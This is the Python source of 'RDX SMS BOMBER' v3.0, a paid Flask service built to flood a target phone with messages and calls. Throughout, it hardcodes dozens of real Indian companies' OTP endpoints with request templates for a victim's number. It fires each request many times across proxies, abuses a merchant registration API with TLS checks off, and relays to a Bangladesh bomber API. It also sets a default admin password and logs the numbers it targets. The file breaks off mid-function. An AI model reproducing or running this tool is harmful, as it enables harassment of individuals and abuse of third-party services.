"""
RDX SMS BOMBER — Main.py  v3.0
Flask web server + bomb engine + SQLite/Firebase dual storage
Developer: @itzrdxking 

New in v3:
  - Fully redesigned dark-glass UI (home + admin)
  - Live stats dashboard with animated counters
  - Per-IP rate limiting on bomb endpoints
  - Maintenance mode toggle
  - Health-check endpoint /health
  - Proxy health-check endpoint /admin/api/proxies
  - Export now also exports usage_log
  - BD API still single-URL (type=sms|call|both)
  - PROXY_MULTIPLIER: every API call fired N×10 times across proxies
"""

import os, re, json, time, html, random, secrets, threading, sqlite3, signal, sys
from datetime import datetime, timezone
from functools import wraps
from collections import defaultdict
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests
from flask import Flask, request, jsonify, session as flask_session, redirect, render_template_string

# ── Clean shutdown ───────────────────────────────────────────────
def _handle_signal(sig, frame):
    print(f"[Main] signal {sig} — shutting down", flush=True)
    sys.exit(0)

signal.signal(signal.SIGTERM, _handle_signal)
signal.signal(signal.SIGINT,  _handle_signal)

# ═══════════════════════════════════════════════════════════════
#  FIREBASE SETUP
# ═══════════════════════════════════════════════════════════════
try:
    import firebase_admin
    from firebase_admin import credentials, firestore
    FIREBASE_AVAILABLE = True
except ImportError:
    FIREBASE_AVAILABLE = False

_db = None

def _init_firebase():
    global _db
    if not FIREBASE_AVAILABLE:
        return None
    try:
        if firebase_admin._apps:
            _db = firestore.client()
            return _db
        fb_key_json = os.environ.get("FIREBASE_KEY_JSON")
        fb_key_path = os.environ.get("FIREBASE_KEY_PATH", "firebase-key.json")
        if fb_key_json:
            cred = credentials.Certificate(json.loads(fb_key_json))
        elif os.path.exists(fb_key_path):
            cred = credentials.Certificate(fb_key_path)
        else:
            return None
        firebase_admin.initialize_app(cred)
        _db = firestore.client()
        return _db
    except Exception as e:
        print(f"❌ Firebase error: {e}")
        return None

def _load_dotenv(path=".env"):
    if not os.path.exists(path): return
    with open(path) as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith("#") or "=" not in line: continue
            k, _, v = line.partition("=")
            k, v = k.strip(), v.strip().strip('"').strip("'")
            if k and k not in os.environ: os.environ[k] = v

_load_dotenv()
_init_firebase()

# ═══════════════════════════════════════════════════════════════
#  CONFIG
# ═══════════════════════════════════════════════════════════════
ADMIN_PASSWORD = os.environ.get("ADMIN_PASSWORD", "itzrdxking")
DEVELOPER      = os.environ.get("DEVELOPER_TAG", "@itzrdxking")
DEVELOPER_URL  = os.environ.get("DEVELOPER_URL", "https://t.me/itzrdxking")
CONTACT        = os.environ.get("CONTACT_USERNAME", "itzrdxking").lstrip("@")
CONTACT_URL    = f"https://t.me/{CONTACT}"

PORT       = int(os.environ.get("PORT", os.environ.get("SERVER_PORT", 5000)))
BASE_URL   = os.environ.get("BASE_URL", f"http://localhost:{PORT}").strip().rstrip("/")
SECRET_KEY = os.environ.get("SECRET_KEY") or secrets.token_hex(32)
BOT_USERNAME = os.environ.get("BOT_USERNAME", "Rdxmixbombot")
SQLITE_PATH  = os.environ.get("SQLITE_PATH", "rdx_bot.db")

CREDITS_PER_REFERRAL   = int(os.environ.get("CREDITS_PER_REFERRAL", "3"))
CREDITS_SMS_BOMB       = int(os.environ.get("CREDITS_SMS_BOMB", "2"))
CREDITS_CALL_BOMB      = int(os.environ.get("CREDITS_CALL_BOMB", "5"))
CREDITS_CUSTOM_BOMB    = int(os.environ.get("CREDITS_CUSTOM_BOMB", "3"))
CREDITS_MIXED_BOMB_BD  = int(os.environ.get("CREDITS_MIXED_BOMB_BD", "7"))
CREDITS_NUCLEAR_IND    = int(os.environ.get("CREDITS_NUCLEAR_IND", "5"))
CREDITS_NUCLEAR_BD     = int(os.environ.get("CREDITS_NUCLEAR_BD", "30"))

PROXY_FILE       = os.environ.get("PROXY_FILE", "Proxies.txt")
USE_PROXY        = os.environ.get("USE_PROXY", "true").lower() in ("1","true","yes","on")
REQUIRE_API_KEY  = os.environ.get("REQUIRE_API_KEY", "true").lower() in ("1","true","yes","on")
API_DAILY_LIMIT  = int(os.environ.get("API_DAILY_LIMIT", "500"))
PROXY_MULTIPLIER = int(os.environ.get("PROXY_MULTIPLIER", "10"))
MAINTENANCE_MODE = os.environ.get("MAINTENANCE_MODE", "false").lower() in ("1","true","yes","on")

# Rate limiting (new)
RATE_LIMIT_WINDOW = int(os.environ.get("RATE_LIMIT_WINDOW", "60"))   # seconds
RATE_LIMIT_MAX    = int(os.environ.get("RATE_LIMIT_MAX", "10"))       # requests per window

# ═══════════════════════════════════════════════════════════════
#  RATE LIMITER (new)
# ═══════════════════════════════════════════════════════════════
_rate_store: dict = defaultdict(list)
_rate_lock = threading.Lock()

def _check_rate(ip: str) -> bool:
    """Returns True if request is allowed."""
    now = time.time()
    with _rate_lock:
        hits = _rate_store[ip]
        _rate_store[ip] = [t for t in hits if now - t < RATE_LIMIT_WINDOW]
        if len(_rate_store[ip]) >= RATE_LIMIT_MAX:
            return False
        _rate_store[ip].append(now)
        return True

# ═══════════════════════════════════════════════════════════════
#  SQLITE DUAL-WRITE LAYER
# ═══════════════════════════════════════════════════════════════
_sq_lock = threading.Lock()

def _sq():
    conn = sqlite3.connect(SQLITE_PATH, check_same_thread=False, timeout=15)
    conn.row_factory = sqlite3.Row
    conn.execute("PRAGMA journal_mode=WAL")
    conn.execute("PRAGMA synchronous=NORMAL")
    return conn

def init_sqlite():
    with _sq_lock:
        conn = _sq()
        with conn:
            conn.executescript("""
            CREATE TABLE IF NOT EXISTS users (
                id INTEGER PRIMARY KEY,
                username TEXT DEFAULT '',
                first_name TEXT DEFAULT '',
                joined_at INTEGER DEFAULT 0,
                referred_by INTEGER,
                ref_counted INTEGER DEFAULT 0,
                ref_points INTEGER DEFAULT 0,
                total_refs INTEGER DEFAULT 0,
                credits INTEGER DEFAULT 0,
                banned INTEGER DEFAULT 0,
                total_bombs INTEGER DEFAULT 0,
                is_premium INTEGER DEFAULT 0
            );
            CREATE TABLE IF NOT EXISTS api_keys (
                key TEXT PRIMARY KEY,
                user_id TEXT DEFAULT '',
                created_at INTEGER DEFAULT 0,
                expires_at INTEGER DEFAULT 0,
                revoked INTEGER DEFAULT 0,
                daily_limit INTEGER DEFAULT 500,
                plan TEXT DEFAULT ''
            );
            CREATE TABLE IF NOT EXISTS channels (
                chat_id TEXT PRIMARY KEY,
                title TEXT DEFAULT '',
                link TEXT DEFAULT '',
                added_at INTEGER DEFAULT 0
            );
            CREATE TABLE IF NOT EXISTS settings (
                k TEXT PRIMARY KEY,
                v TEXT DEFAULT ''
            );
            CREATE TABLE IF NOT EXISTS gift_codes (
                code TEXT PRIMARY KEY,
                credits INTEGER DEFAULT 0,
                max_users INTEGER DEFAULT 0,
                claimed_count INTEGER DEFAULT 0,
                expires_at INTEGER DEFAULT 0,
                created_at INTEGER DEFAULT 0,
                is_premium INTEGER DEFAULT 0
            );
            CREATE TABLE IF NOT EXISTS gift_claims (
                id TEXT PRIMARY KEY,
                code TEXT DEFAULT '',
                user_id TEXT DEFAULT '',
                claimed_at INTEGER DEFAULT 0
            );
            CREATE TABLE IF NOT EXISTS usage_log (
                id TEXT PRIMARY KEY,
                key_id TEXT DEFAULT '',
                day TEXT DEFAULT '',
                count INTEGER DEFAULT 0
            );
            CREATE TABLE IF NOT EXISTS bomb_log (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                key_id TEXT DEFAULT '',
                country TEXT DEFAULT '',
                mode TEXT DEFAULT '',
                number TEXT DEFAULT '',
                sent INTEGER DEFAULT 0,
                total INTEGER DEFAULT 0,
                ts INTEGER DEFAULT 0
            );
            """)
        conn.close()

# ── user helpers ─────────────────────────────────────────────────
def sq_get_user(uid):
    with _sq_lock:
        conn = _sq()
        try:
            row = conn.execute("SELECT * FROM users WHERE id=?", (int(uid),)).fetchone()
            return dict(row) if row else None
        except: return None
        finally: conn.close()

def sq_upsert_user(uid, data: dict):
    with _sq_lock:
        conn = _sq()
        try:
            existing = conn.execute("SELECT * FROM users WHERE id=?", (int(uid),)).fetchone()
            if existing:
                sets = ", ".join(f"{k}=?" for k in data if k != "id")
                vals = [v for k, v in data.items() if k != "id"] + [int(uid)]
                conn.execute(f"UPDATE users SET {sets} WHERE id=?", vals)
            else:
                data["id"] = int(uid)
                cols = ", ".join(data.keys())
                placeholders = ", ".join("?" * len(data))
                conn.execute(f"INSERT OR REPLACE INTO users ({cols}) VALUES ({placeholders})", list(data.values()))
            conn.commit()
        except Exception as e:
            print(f"[SQLite] upsert_user error: {e}")
        finally: conn.close()

def sq_update_user(uid, **kwargs):
    with _sq_lock:
        conn = _sq()
        try:
            sets = ", ".join(f"{k}=?" for k in kwargs)
            vals = list(kwargs.values()) + [int(uid)]
            conn.execute(f"UPDATE users SET {sets} WHERE id=?", vals)
            conn.commit()
        except Exception as e:
            print(f"[SQLite] update_user error: {e}")
        finally: conn.close()

def sq_incr_user(uid, field, amount):
    with _sq_lock:
        conn = _sq()
        try:
            conn.execute(f"UPDATE users SET {field}={field}+? WHERE id=?", (amount, int(uid)))
            conn.commit()
        except Exception as e:
            print(f"[SQLite] incr_user error: {e}")
        finally: conn.close()

def sq_all_users(limit=5000):
    with _sq_lock:
        conn = _sq()
        try:
            rows = conn.execute("SELECT * FROM users LIMIT ?", (limit,)).fetchall()
            return [dict(r) for r in rows]
        except: return []
        finally: conn.close()

def sq_get_key(key):
    with _sq_lock:
        conn = _sq()
        try:
            row = conn.execute("SELECT * FROM api_keys WHERE key=?", (key,)).fetchone()
            return dict(row) if row else None
        except: return None
        finally: conn.close()

def sq_upsert_key(key, data: dict):
    with _sq_lock:
        conn = _sq()
        try:
            data["key"] = key
            cols = ", ".join(data.keys())
            placeholders = ", ".join("?" * len(data))
            conn.execute(f"INSERT OR REPLACE INTO api_keys ({cols}) VALUES ({placeholders})", list(data.values()))
            conn.commit()
        except Exception as e:
            print(f"[SQLite] upsert_key error: {e}")
        finally: conn.close()

def sq_incr_usage(key):
    today = time.strftime("%Y-%m-%d", time.gmtime())
    uid_key = f"{key}_{today}"
    with _sq_lock:
        conn = _sq()
        try:
            conn.execute(
                "INSERT INTO usage_log (id, key_id, day, count) VALUES (?,?,?,1) "
                "ON CONFLICT(id) DO UPDATE SET count=count+1",
                (uid_key, key, today)
            )
            conn.commit()
            row = conn.execute("SELECT count FROM usage_log WHERE id=?", (uid_key,)).fetchone()
            return row[0] if row else 1
        except: return 0
        finally: conn.close()

def sq_usage_today(key):
    today = time.strftime("%Y-%m-%d", time.gmtime())
    uid_key = f"{key}_{today}"
    with _sq_lock:
        conn = _sq()
        try:
            row = conn.execute("SELECT count FROM usage_log WHERE id=?", (uid_key,)).fetchone()
            return row[0] if row else 0
        except: return 0
        finally: conn.close()

def sq_get_setting(k, default=None):
    with _sq_lock:
        conn = _sq()
        try:
            row = conn.execute("SELECT v FROM settings WHERE k=?", (k,)).fetchone()
            return row[0] if row else default
        except: return default
        finally: conn.close()

def sq_set_setting(k, v):
    with _sq_lock:
        conn = _sq()
        try:
            conn.execute("INSERT OR REPLACE INTO settings (k,v) VALUES (?,?)", (k, str(v)))
            conn.commit()
        except: pass
        finally: conn.close()

def sq_all_channels():
    with _sq_lock:
        conn = _sq()
        try:
            rows = conn.execute("SELECT * FROM channels").fetchall()
            return [dict(r) for r in rows]
        except: return []
        finally: conn.close()

def sq_upsert_channel(chat_id, title, link):
    with _sq_lock:
        conn = _sq()
        try:
            conn.execute(
                "INSERT OR REPLACE INTO channels (chat_id,title,link,added_at) VALUES (?,?,?,?)",
                (str(chat_id), title, link, int(time.time()))
            )
            conn.commit()
        except: pass
        finally: conn.close()

def sq_del_channel(chat_id):
    with _sq_lock:
        conn = _sq()
        try:
            conn.execute("DELETE FROM channels WHERE chat_id=?", (str(chat_id),))
            conn.commit()
        except: pass
        finally: conn.close()

def sq_import_users(users_list: list):
    with _sq_lock:
        conn = _sq()
        try:
            for u in users_list:
                if "id" not in u: continue
                data = {k: v for k, v in u.items() if k in (
                    "id","username","first_name","joined_at","referred_by",
                    "ref_counted","ref_points","total_refs","credits","banned",
                    "total_bombs","is_premium"
                )}
                cols = ", ".join(data.keys())
                placeholders = ", ".join("?" * len(data))
                conn.execute(
                    f"INSERT OR IGNORE INTO users ({cols}) VALUES ({placeholders})",
                    list(data.values())
                )
            conn.commit()
            return True
        except Exception as e:
            print(f"[SQLite] import_users error: {e}")
            return False
        finally: conn.close()

def sq_log_bomb(key_id, country, mode, number, sent, total):
    with _sq_lock:
        conn = _sq()
        try:
            conn.execute(
                "INSERT INTO bomb_log (key_id,country,mode,number,sent,total,ts) VALUES (?,?,?,?,?,?,?)",
                (key_id, country, mode, number, sent, total, int(time.time()))
            )
            conn.commit()
        except: pass
        finally: conn.close()

def sq_recent_bombs(limit=50):
    with _sq_lock:
        conn = _sq()
        try:
            rows = conn.execute(
                "SELECT * FROM bomb_log ORDER BY ts DESC LIMIT ?", (limit,)
            ).fetchall()
            return [dict(r) for r in rows]
        except: return []
        finally: conn.close()

# ═══════════════════════════════════════════════════════════════
#  INDIA SMS APIs
# ═══════════════════════════════════════════════════════════════
INDIA_SMS_APIS = [
    {"name": "Lenskart",        "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"phoneCode":"+91","telephone":"{p}"}}'},
    {"name": "NoBroker",        "url": "https://www.nobroker.in/api/v3/account/otp/send",
     "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"},
     "data": lambda p: f"phone={p}&countryCode=IN"},
    {"name": "PharmEasy",       "url": "https://pharmeasy.in/api/v2/auth/send-otp",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Wakefit",         "url": "https://api.wakefit.co/api/consumer-sms-otp/",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Byjus",           "url": "https://api.byjus.com/v2/otp/send",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Hungama",         "url": "https://communication.api.hungama.com/v1/communication/otp",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"mobileNo":"{p}","countryCode":"+91","appCode":"un","messageId":"1","device":"web"}}'},
    {"name": "MeruCab",         "url": "https://merucabapp.com/api/otp/generate",
     "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"},
     "data": lambda p: f"mobile_number={p}"},
    {"name": "Doubtnut",        "url": "https://api.doubtnut.com/v4/student/login",
     "method": "POST", "headers": {"content-type": "application/json; charset=utf-8"},
     "data": lambda p: f'{{"phone_number":"{p}","language":"en"}}'},
    {"name": "PenPencil",       "url": "https://api.penpencil.co/v1/users/resend-otp?smsType=1",
     "method": "POST", "headers": {"content-type": "application/json; charset=utf-8"},
     "data": lambda p: f'{{"organizationId":"5eb393ee95fab7468a79d189","mobile":"{p}"}}'},
    {"name": "Snitch",          "url": "https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/v2",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"mobile_number":"+91{p}"}}'},
    {"name": "DaycoIndia",      "url": "https://ekyc.daycoindia.com/api/nscript_functions.php",
     "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
     "data": lambda p: f"api=send_otp&brand=dayco&mob={p}&resend_otp=resend_otp"},
    {"name": "BeepKart",        "url": "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"phone":"{p}","city":362}}'},
    {"name": "LendingPlate",    "url": "https://lendingplate.com/api.php",
     "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
     "data": lambda p: f"mobiles={p}&resend=Resend"},
    {"name": "BikeFixup",       "url": "https://api.bikefixup.com/api/v2/send-registration-otp",
     "method": "POST", "headers": {"Content-Type": "application/json; charset=UTF-8"},
     "data": lambda p: f'{{"phone":"{p}","app_signature":"4pFtQJwcz6y"}}'},
    {"name": "WellAcademy",     "url": "https://wellacademy.in/store/api/numberLoginV2",
     "method": "POST", "headers": {"Content-Type": "application/json; charset=UTF-8"},
     "data": lambda p: f'{{"contact_no":"{p}"}}'},
    {"name": "ServeTel",        "url": "https://api.servetel.in/v1/auth/otp",
     "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=utf-8"},
     "data": lambda p: f"mobile_number={p}"},
    {"name": "Shemaroome",      "url": "https://www.shemaroome.com/users/resend_otp",
     "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
     "data": lambda p: f"mobile_no=%2B91{p}"},
    {"name": "MyHubble",        "url": "https://api.myhubble.money/v1/auth/otp/generate",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"phoneNumber":"{p}","channel":"SMS"}}'},
    {"name": "TataCapBiz",      "url": "https://businessloan.tatacapital.com/CLIPServices/otp/services/generateOtp",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"mobileNumber":"{p}","deviceOs":"Android","sourceName":"MitayeFaasleWebsite"}}'},
    {"name": "DealShare",       "url": "https://services.dealshare.in/userservice/api/v1/user-login/send-login-code",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"mobile":"{p}","hashCode":"k387IsBaTmn"}}'},
    {"name": "Snapmint",        "url": "https://api.snapmint.com/v1/public/sign_up",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "HousingCom",      "url": "https://login.housing.com/api/v2/send-otp",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"phone":"{p}","country_url_name":"in"}}'},
    {"name": "RentoMojo",       "url": "https://www.rentomojo.com/api/RMUsers/isNumberRegistered",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Khatabook",       "url": "https://api.khatabook.com/v1/auth/request-otp",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"phone":"{p}","app_signature":"wk+avHrHZf2"}}'},
    {"name": "Netmeds",         "url": "https://apiv2.netmeds.com/mst/rest/v1/id/details/",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Nykaa",           "url": "https://www.nykaa.com/app-api/index.php/customer/send_otp",
     "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"},
     "data": lambda p: f"source=sms&app_version=3.0.9&mobile_number={p}&platform=ANDROID&domain=nykaa"},
    {"name": "RummyCircle",     "url": "https://www.rummycircle.com/api/fl/auth/v3/getOtp",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"mobile":"{p}","isPlaycircle":false}}'},
    {"name": "Animall",         "url": "https://animall.in/zap/auth/login",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"phone":"{p}","signupPlatform":"NATIVE_ANDROID"}}'},
    {"name": "Entri",           "url": "https://entri.app/api/v3/users/check-phone/",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Cosmofeed",       "url": "https://prod.api.cosmofeed.com/api/user/authenticate",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"phone":"{p}","version":"1.4.28"}}'},
    {"name": "Aakash",          "url": "https://antheapi.aakash.ac.in/api/generate-lead-otp",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"mobile_number":"{p}","activity_type":"aakash-myadmission"}}'},
    {"name": "Revv",            "url": "https://st-core-admin.revv.co.in/stCore/api/customer/v1/init",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"mobile":"{p}","deviceType":"website"}}'},
    {"name": "A23Games",        "url": "https://pfapi.a23games.in/a23user/signup_by_mobile_otp/v2",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"mobile":"{p}","device_id":"android123","model":"Google,Android SDK built for x86,10"}}'},
    {"name": "Spencers",        "url": "https://jiffy.spencers.in/user/auth/otp/send",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "PayMeIndia",      "url": "https://api.paymeindia.in/api/v2/authentication/phone_no_verify/",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"phone":"{p}","app_signature":"S10ePIIrbH3"}}'},
    {"name": "ShoppersStop",    "url": "https://www.shoppersstop.com/services/v2_1/ssl/sendOTP/OB",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"mobile":"{p}","type":"SIGNIN_WITH_MOBILE"}}'},
    {"name": "WorkIndia",
     "url_fn": lambda p: f"https://api.workindia.in/api/candidate/profile/login/verify-number/?mobile_no={p}&version_number=623",
     "method": "GET", "headers": {}, "data": None},
    {"name": "PokerBaazi",      "url": "https://nxtgenapi.pokerbaazi.com/oauth/user/send-otp",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"mobile":"{p}","mfa_channels":"phno"}}'},
    {"name": "My11Circle",      "url": "https://www.my11circle.com/api/fl/auth/v3/getOtp",
     "method": "POST", "headers": {"Content-Type": "application/json;charset=UTF-8"},
     "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "MamaEarth",       "url": "https://auth.mamaearth.in/v1/auth/initiate-signup",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "HomeTriangle",    "url": "https://hometriangle.com/api/partner/xauth/signup/otp",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "WellnessForever", "url": "https://paalam.wellnessforever.in/crm/v2/firstRegisterCustomer",
     "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"},
     "data": lambda p: 'method=firstRegisterApi&data={"customerMobile":"' + p + '","generateOtp":"true"}'},
    {"name": "HealthMug",       "url": "https://api.healthmug.com/account/createotp",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Vyapar",
     "url_fn": lambda p: f"https://vyaparapp.in/api/ftu/v3/send/otp?country_code=91&mobile={p}",
     "method": "GET", "headers": {}, "data": None},
    {"name": "Kredily",         "url": "https://app.kredily.com/ws/v1/accounts/send-otp/",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "TataMotors",      "url": "https://cars.tatamotors.com/content/tml/pv/in/en/account/login.signUpMobile.json",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"mobile":"{p}","sendOtp":"true"}}'},
    {"name": "Moglix",          "url": "https://apinew.moglix.com/nodeApi/v1/login/sendOTP",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"mobile":"{p}","buildVersion":"24.0"}}'},
    {"name": "TrulyMadly",      "url": "https://app.trulymadly.com/api/auth/mobile/v1/send-otp",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"mobile":"{p}","locale":"IN"}}'},
    {"name": "Apna",            "url": "https://production.apna.co/api/userprofile/v1/otp/",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"mobile":"{p}","hash_type":"play_store"}}'},
    {"name": "Swipe",           "url": "https://app.getswipe.in/api/user/mobile_login",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"mobile":"{p}","resend":true}}'},
    {"name": "MoreRetail",      "url": "https://omni-api.moreretail.in/api/v1/login/",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"mobile":"{p}","hash_key":"XfsoCeXADQA"}}'},
    {"name": "CountryDelight",  "url": "https://api.countrydelight.in/api/v1/customer/requestOtp",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"mobile":"{p}","platform":"Android","mode":"new_user"}}'},
    {"name": "Rapido",          "url": "https://customer.rapido.bike/api/otp",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "ConfirmTkt",
     "url_fn": lambda p: f"https://securedapi.confirmtkt.com/api/platform/registerOutput?mobileNumber={p}",
     "method": "GET", "headers": {}, "data": None},
    {"name": "BetterHalf",      "url": "https://api.betterhalf.ai/v2/auth/otp/send/",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"mobile":"{p}","isd_code":"91"}}'},
    {"name": "Charzer",         "url": "https://api.charzer.com/auth-service/send-otp",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"mobile":"{p}","appSource":"CHARZER_APP"}}'},
    {"name": "Mpokket",         "url": "https://web-api.mpokket.in/registration/sendOtp",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "ShipRocket",      "url": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"mobileNumber":"{p}"}}'},
    {"name": "GoKwik",          "url": "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"phone":"{p}","country":"in"}}'},
    {"name": "NewMe",           "url": "https://prodapi.newme.asia/web/otp/request",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"mobile_number":"{p}","resend_otp_request":true}}'},
    {"name": "Smytten",         "url": "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"phone":"{p}","email":"test@example.com"}}'},
]

# ═══════════════════════════════════════════════════════════════
#  INDIA CUSTOM SMS
# ═══════════════════════════════════════════════════════════════
def custom_sms_india(num: str, name: str = "User", msg: str = "RdxVerify") -> dict:
    payload = {"name": name, "phone_number": num, "business_name": msg}
    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 12; V2027 Build/SP1A.210812.003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/155.0.8059.43 Mobile Safari/537.36",
        "Accept": "application/json",
        "Content-Type": "application/json",
        "origin": "https://merchant.carrybee.com",
        "referer": "https://merchant.carrybee.com/",
    }
    try:
        r = requests.post(
            "https://api-merchant.carrybee.com/api/v2/merchant/register",
            json=payload, headers=headers, timeout=15, verify=False,
        )
        try: return r.json()
        except: return {"status": True, "raw": r.text}
    except Exception as e:
        return {"status": False, "error": str(e)}

# ═══════════════════════════════════════════════════════════════
#  INDIA FIREBASE RTDBs
# ═══════════════════════════════════════════════════════════════
INDIA_FIREBASE_DBS = [
    "https://aaaa-b3749-default-rtdb.firebaseio.com",
    "https://aaya-6e335-default-rtdb.firebaseio.com",
    "https://aditya-9f66b-default-rtdb.firebaseio.com",
    "https://ai-rto-9-default-rtdb.firebaseio.com",
    "https://annapunna-12b79-default-rtdb.firebaseio.com",
    "https://business-apps-5aeb2-default-rtdb.firebaseio.com",
    "https://chfjfj-c2857-default-rtdb.firebaseio.com",
    "https://csforme-dc64a-default-rtdb.firebaseio.com",
    "https://dwala-3d1ff-default-rtdb.firebaseio.com",
    "https://dyydd-c53c8-default-rtdb.firebaseio.com",
    "https://fir-1fa16-default-rtdb.firebaseio.com",
    "https://fir-408f9-default-rtdb.firebaseio.com",
    "https://go-one-1b6b2-default-rtdb.firebaseio.com",
    "https://hopkhfg-9981a-default-rtdb.firebaseio.com",
    "https://indus-1-cec4f-default-rtdb.firebaseio.com",
    "https://jamtara118-7cd20-default-rtdb.firebaseio.com",
    "https://jamtara181-default-rtdb.firebaseio.com",
    "https://jayma-9ce22-default-rtdb.firebaseio.com",
    "https://kaatil-12346-default-rtdb.firebaseio.com",
    "https://komaljah-default-rtdb.firebaseio.com",
    "https://kumarlive1-default-rtdb.firebaseio.com",
    "https://kundan-c848c-default-rtdb.firebaseio.com",
    "https://lovefimus-default-rtdb.firebaseio.com",
    "https://mera-wala-71a5e-default-rtdb.firebaseio.com",
    "https://myabtar-default-rtdb.firebaseio.com",
    "https://myapp-8228a-default-rtdb.firebaseio.com",
    "https://navin512-54d6f-default-rtdb.firebaseio.com",
    "https://newappi-7661a-default-rtdb.firebaseio.com",
    "https://pinkyrani-default-rtdb.firebaseio.com",
    "https://pk114-6e828-default-rtdb.firebaseio.com",
    "https://pm-kisan-20-vgg-default-rtdb.firebaseio.com",
    "https://rahul-54fe9-default-rtdb.firebaseio.com",
    "https://rahulcscperosnl-default-rtdb.firebaseio.com",
    "https://raj-kumar-63492-default-rtdb.firebaseio.com",
]

# ═══════════════════════════════════════════════════════════════
#  BANGLADESH API
# ═══════════════════════════════════════════════════════════════
BD_API_BASE = "https://exodus-bd-sms-bomber-api.onrender.com/"

def _normalize_bd_phone(phone: str) -> str:
    p = re.sub(r'\D', '', str(phone))
    if p.startswith("8801"):   p = "0" + p[3:]
    elif p.startswith("880"):  p = "0" + p[3:]
    elif p.startswith("01"):   pass
    elif p.startswith("1") and len(p) == 10: p = "0" + p
    return p

def _bd_fire(phone: str, type_str: str, limit: int) -> tuple:
    bd_phone = _normalize_bd_phone(phone)
    url = f"{BD_API_BASE}?phone={bd_phone}&api=all&type={type_str}&limit={limit}"
